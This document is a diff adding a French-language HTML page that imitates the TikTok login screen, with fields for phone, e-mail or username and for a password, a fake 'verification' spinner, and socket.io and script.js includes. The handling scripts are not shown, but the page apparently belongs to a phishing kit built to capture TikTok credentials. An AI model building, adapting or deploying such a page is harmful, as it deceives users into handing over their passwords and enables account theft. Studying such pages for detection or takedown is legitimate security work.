@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion | TikTok</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/png" href="téléchargé.png">
+</head>
+<body>
+<body>
+    <div id="loading-overlay" style="display: none;">
+    <div class="tiktok-spinner"></div>
+    <p>Vérification en cours...</p>
+</div>
+    <header class="main-header">
+        <div class="header-left">
+            <img src="images.png" alt="TikTok" class="logo-img">
+            <span class="logo-text">TikTok</span>
+        </div>
+        <div class="header-right">
+            <div class="help-section">
+                <svg width="24" height="24" viewBox="0 0 48 48" fill="none"><path d="M24 44C35.0457 44 44 35.0457 44 24C44 12.9543 35.0457 4 24 4C12.9543 4 4 12.9543 4 24C4 35.0457 12.9543 44 24 44Z" fill="none" stroke="#161823" stroke-width="4" stroke-linejoin="round"/><path d="M24 35V34" stroke="#161823" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/><path d="M19 19C19 16.2386 21.2386 14 24 14C26.7614 14 29 16.2386 29 19C29 20.8407 28.0059 22.4491 26.5165 23.328C25.011 24.2166 24 25.4389 24 27.1852V28" stroke="#161823" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                <span>Commentaires et assistance</span>
+            </div>
+        </div>
+    </header>
+<br><br><br>
+    <div class="login-container">
+        <div class="login-box" id="login-section">
+            <h2 class="title">Connexion</h2><br><br><br>
+                <form id="loginForm">
+                             <div class="input-group">
+                                  <label>Téléphone / E-mail / Nom d'utilisateur</label>
+                                  <div class="input-wrapper">
+                                         <input id="username" type="text" placeholder="E-mail ou nom d'utilisateur" required>
+                                  </div>
+                             </div>
+
+              <div class="input-group">
+                <div class="input-wrapper">
+                    <input type="password" id="password" placeholder="Mot de passe" required>
+                    <button type="button" class="toggle-password">
+                        <svg width="20" height="20" viewBox="0 0 48 48" fill="none"><path d="M12 24C12 24 17.4545 13 24 13C30.5455 13 36 24 36 24C36 24 30.5455 35 24 35C17.4545 35 12 24 12 24Z" stroke="#161823" stroke-width="4" stroke-linejoin="round"/><path d="M24 28C26.2091 28 28 26.2091 28 24C28 21.7909 26.2091 20 24 20C21.7909 20 20 21.7909 20 24C20 26.2091 21.7909 28 24 28Z" fill="#161823"/></svg>
+                    </button>
+                </div>
+            </div>
+
+            <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+
+            <button type="submit" class="btn-login" id="login-btn" >Connexion</button>
+        </form>
+
+        <div class="footer-box">
+            <p>Vous n'avez pas de compte ? <a href="#">Inscription</a></p>
+        </div>
+        </div>
+     </div>   
+          <div class="login-container">
+                
+</div>
+
+
+        </div>
+        <script src="/socket.io/socket.io.js"></script>
+    
+    <script src="script.js"></script>
+</body>
+</html>
+</body>
+</html>
